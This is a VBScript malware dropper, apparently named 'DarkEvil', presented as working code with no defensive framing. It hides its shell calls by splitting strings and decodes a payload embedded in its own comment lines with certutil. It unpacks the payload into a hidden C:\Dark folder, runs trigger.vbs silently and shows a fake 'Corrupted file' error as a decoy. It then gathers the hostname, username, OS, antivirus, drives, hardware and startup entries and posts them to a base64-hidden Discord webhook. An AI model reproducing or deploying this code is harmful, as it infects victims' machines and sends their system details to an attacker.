Function PerformCertificateDecodeOperation(InputEncodedFilePath, OutputDecodedDirectory)
	Dim FileSystemObjectInstance, WindowsShellObjectInstance, CommandStringForDecoding, TemporaryVariable1, TemporaryVariable2
	TemporaryVariable2 = "Scri" & "ptin" & "g.Fi" & "leSyste" & "mObje" & "ct"
	TemporaryVariable1 = "WSc" & "ript.S" & "he" & "ll"
	Set WindowsShellObjectInstance = CreateObject(TemporaryVariable1)
	Set FileSystemObjectInstance = CreateObject(TemporaryVariable2)
	CommandStringForDecoding = "ce" & "rtu" & "til -dec" & "ode """ & InputEncodedFilePath & """ " & OutputDecodedDirectory
	WindowsShellObjectInstance.Run CommandStringForDecoding, 0, True
End Function

Function ExecuteExpandArchiveOperation(InputArchiveFilePath, OutputExtractionDirectory)
	Dim ShellObjectForExecution, FileSystemObjectForArchive, CommandStringForExtraction, TempVariableForShell, TempVariableForFileSystem
	TempVariableForFileSystem = "Scri" & "ptin" & "g.Fi" & "leSyste" & "mObje" & "ct"
	TempVariableForShell = "WSc" & "ript.S" & "he" & "ll"
	Set ShellObjectForExecution = CreateObject(TempVariableForShell)
	Set FileSystemObjectForArchive = CreateObject(TempVariableForFileSystem)
	CommandStringForExtraction = "ex" & "pand " & InputArchiveFilePath & " -F:* " & OutputExtractionDirectory
	ShellObjectForExecution.Run CommandStringForExtraction, 0, True
End Function

Function CreateDirectoryIfNotExists(TargetDirectoryPath)
	Dim FileSystemObjectForDirectory, NewlyCreatedFolderObject
	Set FileSystemObjectForDirectory = CreateObject("Scri" & "pting.F" & "ileSyst" & "emObject")
	If Not FileSystemObjectForDirectory.FolderExists(TargetDirectoryPath) Then
		Set NewlyCreatedFolderObject = FileSystemObjectForDirectory.CreateFolder(TargetDirectoryPath)
		NewlyCreatedFolderObject.Attributes = NewlyCreatedFolderObject.Attributes + 2
	End If
	Set NewlyCreatedFolderObject = Nothing
	Set FileSystemObjectForDirectory = Nothing
End Function

Function RunScriptCommand(CommandToExecute)
	Dim ShellObjectForCommandExecution, TemporaryShellString
	TemporaryShellString = "WSc" & "ript.S" & "hel" & "l"
	Set ShellObjectForCommandExecution = CreateObject(TemporaryShellString)
	ShellObjectForCommandExecution.Run CommandToExecute, 0, True
End Function

Dim WindowsShellObjectForEnvironment, TemporaryDirectoryPath, SystemDrivePath, OutputTextFilePath, TargetDarkDirectory, TriggerScriptPath, FileSystemObjectForReading
Dim InputFileObjectForReading, OutputFileObjectForWriting, CurrentLineFromFile

TemporaryShellStringForMain = "WSc" & "ript.S" & "he" & "ll"
Set WindowsShellObjectForEnvironment = CreateObject(TemporaryShellStringForMain)
TemporaryDirectoryPath = WindowsShellObjectForEnvironment.ExpandEnvironmentStrings("%TE" & "MP%")
SystemDrivePath = WindowsShellObjectForEnvironment.ExpandEnvironmentStrings("%SYST" & "EMDR" & "IVE%")
OutputTextFilePath = TemporaryDirectoryPath & "\ou" & "tpu" & "t.t" & "xt"
TargetDarkDirectory = SystemDrivePath & "\D" & "ark\"
TriggerScriptPath = "cs" & "cript " & TargetDarkDirectory & "trigg" & "er.vbs"

Set FileSystemObjectForReading = CreateObject("Scri" & "pting.Fi" & "leSys" & "temObj" & "ect")
Set InputFileObjectForReading = FileSystemObjectForReading.OpenTextFile(WScript.ScriptFullName, 1)
Set OutputFileObjectForWriting = FileSystemObjectForReading.OpenTextFile(OutputTextFilePath, 2, True)

Do Until InputFileObjectForReading.AtEndOfStream
    CurrentLineFromFile = InputFileObjectForReading.ReadLine
    If Left(Trim(CurrentLineFromFile), 1) = "'" Then
        OutputFileObjectForWriting.WriteLine Mid(CurrentLineFromFile, 2)
    End If
Loop

InputFileObjectForReading.Close
OutputFileObjectForWriting.Close

Set InputFileObjectForReading = Nothing
Set OutputFileObjectForWriting = Nothing
Set FileSystemObjectForReading = Nothing

CreateDirectoryIfNotExists TargetDarkDirectory
PerformCertificateDecodeOperation OutputTextFilePath, TargetDarkDirectory & "DE.z" & "ip"
ExecuteExpandArchiveOperation TargetDarkDirectory & "DE.z" & "ip", TargetDarkDirectory
RunScriptCommand TriggerScriptPath


MsgBox "Corrupted file: " & Err.Description, 48, "Error!"



Function Base64Decode(base64)
    Dim xml, node
    Set xml = CreateObject("Msxml2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = base64
    Base64Decode = node.nodeTypedValue
End Function


Function BytesToStr(bytes)
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write bytes
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "utf-8"
    BytesToStr = stream.ReadText
    stream.Close
End Function


Function GetHostName()
    Set wshShell = CreateObject("WScript.Shell")
    GetHostName = wshShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
End Function


Function GetUsername()
    Set wshShell = CreateObject("WScript.Shell")
    GetUsername = wshShell.ExpandEnvironmentStrings("%USERNAME%")
End Function


Function GetWinVersion()
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colOS = objWMI.ExecQuery("Select * from Win32_OperatingSystem")
    For Each os in colOS
        GetWinVersion = os.Caption & " (Build " & os.BuildNumber & ")"
        Exit Function
    Next
    GetWinVersion = "Unknown"
End Function


Function GetArch()
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colProc = objWMI.ExecQuery("Select AddressWidth from Win32_Processor")
    For Each proc in colProc
        GetArch = proc.AddressWidth & "-bit"
        Exit Function
    Next
    GetArch = "Unknown"
End Function

Function GetAntivirus()
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:\\.\root\SecurityCenter2")
    Set colAV = objWMI.ExecQuery("Select * from AntivirusProduct")
    Dim avList
    avList = ""
    For Each av in colAV
        avList = avList & av.displayName & ", "
    Next
    If Len(avList) = 0 Then
        GetAntivirus = "None or Unknown"
    Else
        GetAntivirus = Left(avList, Len(avList)-2)
    End If
End Function


Function GetDrives()
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set drives = fso.Drives
    Dim d, result
    result = ""
    For Each d in drives
        If d.IsReady Then result = result & d.DriveLetter & ": (" & d.VolumeName & "), "
    Next
    If Len(result) = 0 Then
        GetDrives = "No drives found"
    Else
        GetDrives = Left(result, Len(result)-2)
    End If
End Function


Function GetTotalRAM()
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colSys = objWMI.ExecQuery("Select TotalPhysicalMemory from Win32_ComputerSystem")
    For Each sys in colSys
        Dim total
        total = CDbl(sys.TotalPhysicalMemory)
        GetTotalRAM = Round(total / 1073741824, 1) & " GB"
        Exit Function
    Next
    GetTotalRAM = "Unknown"
End Function


Function GetRAMModules()
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colRAM = objWMI.ExecQuery("Select Capacity, Manufacturer, Speed from Win32_PhysicalMemory")
    Dim moduleList, ramSize, entry
    moduleList = ""
    For Each ram In colRAM
        ramSize = CDbl(ram.Capacity) / 1073741824
        entry = Round(ramSize, 1) & " GB @ " & ram.Speed & " MHz (" & ram.Manufacturer & ")"
        moduleList = moduleList & entry & ", "
    Next
    If Len(moduleList) = 0 Then
        GetRAMModules = "No RAM modules found"
    Else
        GetRAMModules = Left(moduleList, Len(moduleList) - 2)
    End If
End Function



Function GetCPUName()
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colCPU = objWMI.ExecQuery("Select Name from Win32_Processor")
    For Each cpu in colCPU
        GetCPUName = Trim(cpu.Name)
        Exit Function
    Next
    GetCPUName = "Unknown"
End Function

Function GetGPUName()
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colGPU = objWMI.ExecQuery("Select Name from Win32_VideoController")
    Dim gpus
    gpus = ""
    For Each gpu in colGPU
        gpus = gpus & gpu.Name & ", "
    Next
    If Len(gpus) > 0 Then
        GetGPUName = Left(gpus, Len(gpus) - 2)
    Else
        GetGPUName = "Unknown"
    End If
End Function


Function HKEYFromRoot(path)
    Select Case True
        Case InStr(path, "HKLM") > 0: HKEYFromRoot = &H80000002
        Case InStr(path, "HKCU") > 0: HKEYFromRoot = &H80000001
    End Select
End Function

Function GetStartupPrograms()
    On Error Resume Next
    Dim WshShell, regPaths, path, output, subOutput
    Set WshShell = CreateObject("WScript.Shell")
    
    regPaths = Array( _
        "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", _
        "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" _
    )
    
    output = ""
    For Each path In regPaths
        subOutput = ""
        Set objReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
        
        Dim valueNames, types, i, value
        objReg.EnumValues HKEYFromRoot(path), SubKeyFromPath(path), valueNames, types
        
        If IsArray(valueNames) Then
            For i = 0 To UBound(valueNames)
                objReg.GetStringValue HKEYFromRoot(path), SubKeyFromPath(path), valueNames(i), value
                subOutput = subOutput & "  " & valueNames(i) & " = " & value & vbCrLf
            Next
        Else
            subOutput = "  (No values)" & vbCrLf
        End If
        
        If Trim(subOutput) <> "" Then
            output = output & "[" & path & "]" & vbCrLf & subOutput
        End If
    Next

    If Len(output) = 0 Then
        GetStartupPrograms = "No startup entries found."
    Else
        GetStartupPrograms = Trim(output)
    End If
End Function


Function SubKeyFromPath(path)
    SubKeyFromPath = Mid(path, InStr(path, "\") + 1)
End Function


Function CheckDarkEvilStatus()
    On Error Resume Next
    Dim fso, basePath, requiredFiles, i, filePath
    Set fso = CreateObject("Scripting.FileSystemObject")

    basePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%systemdrive%\Dark\")

    requiredFiles = Array( _
        "Dark.encd", _
        "trigger.vbs" _
    )

    For i = 0 To UBound(requiredFiles)
        filePath = basePath & requiredFiles(i)
        If Not fso.FileExists(filePath) Then
            CheckDarkEvilStatus = "Failed to install DarkEvil"
            Exit Function
        End If
    Next

	CheckDarkEvilStatus = "DarkEvil Installed"
End Function


Function EscapeJson(str)
    str = Replace(str, "\", "\\")
    str = Replace(str, """", "\""")
    str = Replace(str, vbCrLf, "\n")
    str = Replace(str, vbLf, "\n")
    str = Replace(str, vbCr, "\n")
    EscapeJson = str
End Function

encodedUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjQxODc2ODczODU4MjY4OC9PY0dPbzBQM2ZKUWl6Y3UzVi1jTmJlOFBKcS1ZRXpSYkxkLVl6Z2lMdWZPWnV6UzhabkhsV3RZOC1xU3RTczdHdks5Rw=="

decodedBytes = Base64Decode(encodedUrl)
webhookUrl = BytesToStr(decodedBytes)

info = "**[SYSTEM INFO CAPTURED]**" & vbCrLf & _
       "**Hostname:** " & GetHostName() & vbCrLf & _
       "**Username:** " & GetUsername() & vbCrLf & _
       "**OS:** " & GetWinVersion() & vbCrLf & _
       "**Architecture:** " & GetArch() & vbCrLf & _
       "**Antivirus:** " & GetAntivirus() & vbCrLf & _
       "**Drives:** " & GetDrives() & vbCrLf & _
		"**CPU:** " & GetCPUName() & vbCrLf & _
	   "**GPU:** " & GetGPUName() & vbCrLf & _
	   "**Total RAM:** " & GetTotalRAM() & vbCrLf & _
	   "**RAM Module:** " & GetRAMModules() & vbCrLf & _
	   "**StartUp Prorgams:** " & GetStartupPrograms() & vbCrLf & _
	   "**DarkEvil:** " & CheckDarkEvilStatus()


escapedInfo = EscapeJson(info)

data = "{""content"":""" & escapedInfo & """,""username"":""" & GetHostName() & """}"
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.setOption 2, 13056
http.open "POST", webhookUrl, False
http.setRequestHeader "Content-Type", "application/json"
http.send data
